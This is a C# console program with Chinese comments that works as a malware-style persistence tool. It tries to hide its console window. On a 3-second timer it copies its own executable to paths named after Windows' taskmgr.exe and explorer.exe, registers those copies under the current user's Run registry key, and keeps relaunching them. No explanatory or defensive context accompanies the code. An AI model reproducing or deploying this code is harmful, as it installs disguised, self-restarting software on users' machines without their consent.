using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.Timers;

namespace ConsoleApplication1
{
    class Program
    {
        //--------------下面是隐藏控制台窗体-------------
        [DllImport("User32.dll", EntryPoint = "FindWindow")]
        private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll", EntryPoint = "FindWindowEx")]   //找子窗体   
        private static extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string lpszClass, string lpszWindow);

        [DllImport("User32.dll", EntryPoint = "SendMessage")]   //用于发送信息给窗体   
        private static extern int SendMessage(IntPtr hWnd, int Msg, IntPtr wParam, string lParam);

        [DllImport("User32.dll", EntryPoint = "ShowWindow")]   //
        private static extern bool ShowWindow(IntPtr hWnd, int type);
        //--------------上面是隐藏控制台窗体-------------


        //计时器
        private static void SetTimer()
        {
            // Create a timer with a two second interval.
            System.Timers.Timer aTimer = new System.Timers.Timer(3000);//2000ms
            // Hook up the Elapsed event for the timer. 
            aTimer.Elapsed += OnTimedEvent;//为计时器附加函数功能
            aTimer.AutoReset = true;//自动模式
            aTimer.Enabled = true;//开始
        }
        //计时器附加函数
        private static void OnTimedEvent(Object source, ElapsedEventArgs e)
        {
            Console.WriteLine("The Elapsed event was raised at {0:HH:mm:ss.fff}",e.SignalTime);
 //         string localPah_explorer = Application.ExecutablePath;
 //         Console.Write(localPah_explorer);


            //获取当前应用程序的路径
            RegistryKey reg = Registry.CurrentUser;
            string localPath = Application.ExecutablePath;
            if (!System.IO.File.Exists(localPath))//判断指定文件是否存在
                return;
            //开始路径复制
            string  taskmgr_file=@"c:\Windows\taskmgr.exe";
            string  explorer_file=@"c:\Windows\System32\explorer.exe";
            if (!System.IO.File.Exists(taskmgr_file) && !System.IO.File.Exists(explorer_file))
            {
                File.Copy(localPath, taskmgr_file,true);
                File.Copy(localPath, explorer_file, true);
                Console.WriteLine("taskmgr.exe与explorer.exe已经被安装");
            }
            else if (!System.IO.File.Exists(taskmgr_file))
            {
                File.Copy(localPath, taskmgr_file, true);
                Console.WriteLine("taskmgr.exe已经被安装");
            }
            else if (!System.IO.File.Exists(explorer_file))
            {
                File.Copy(localPath, explorer_file, true);
                Console.WriteLine("explorer.exe已经被安装");
            }





            //开始注册表检测
            RegistryKey run = reg.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run");
            //判断注册表中是否存在当前名称和值
            //value值是注册表名，为了区分（好删除）用了后缀
            if (run.GetValue("taskmgr.exe") == null && run.GetValue("explorer.exe") == null)
            {
                try
                {
                    run.SetValue("taskmgr.exe", taskmgr_file);
                    run.SetValue("explorer.exe", explorer_file);
                    MessageBox.Show("  当前应用程序taskmgr与explorer已成功写入注册表！", "温馨提示", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    reg.Close();
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message.ToString(), "温馨提示", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
            else if (run.GetValue("explorer.exe") == null)
            {
                try
                {
                    run.SetValue("explorer.exe", explorer_file);
                    MessageBox.Show("  当前应用程序explorer已成功写入注册表！", "温馨提示", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    reg.Close();
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message.ToString(), "温馨提示", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
            else if (run.GetValue("taskmgr.exe") == null)
            {
                try
                {
                    run.SetValue("taskmgr.exe", taskmgr_file);
                    MessageBox.Show("  当前应用程序taskmg已成功写入注册表！", "温馨提示", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    reg.Close();
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message.ToString(), "温馨提示", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }



            //开始程序运行
            Process[] local_explorer = Process.GetProcessesByName("explorer");
            Process[] local_taskmgr = Process.GetProcessesByName("taskmgr");
            //程序同时开启
            if (local_explorer.Length != 2 && local_taskmgr.Length != 2)
            {
                Process.Start(@"c:\Windows\taskmgr.exe");
                Process.Start(@"c:\Windows\System32\explorer.exe");
                System.Windows.Forms.MessageBox.Show("I'm still here.");
            }
            else if (local_explorer.Length != 2)
            {
                Process.Start(@"c:\Windows\System32\explorer.exe");
            }
            else if (local_taskmgr.Length != 2)
            {
                Process.Start(@"c:\Windows\taskmgr.exe");
            }




            //跳出弹窗“这里选择的事件是：explorer存在”
            String localPath_explorer = System.AppDomain.CurrentDomain.BaseDirectory;
            if (localPath_explorer == "C:\\Windows\\System32\\")
            {
                Console.WriteLine("explorer is still here!");
                if (local_explorer.Length == 2 && local_taskmgr.Length == 2)
                 {
                     System.Windows.Forms.MessageBox.Show("I'm still here.");
                 }
            }
            

        }

        static void Main(string[] args)
        {
         
            Console.Title = "隐藏控制台";
            IntPtr ParenthWnd = new IntPtr(0);
            IntPtr et = new IntPtr(0);
            ParenthWnd = FindWindow(null, "隐藏控制台");
            ShowWindow(ParenthWnd, 1);//隐藏本dos窗体, 0: 后台执行；1:正常启动；2:最小化到任务栏；3:最大化
           
            SetTimer();
            Application.Run();   
        }
    }
}
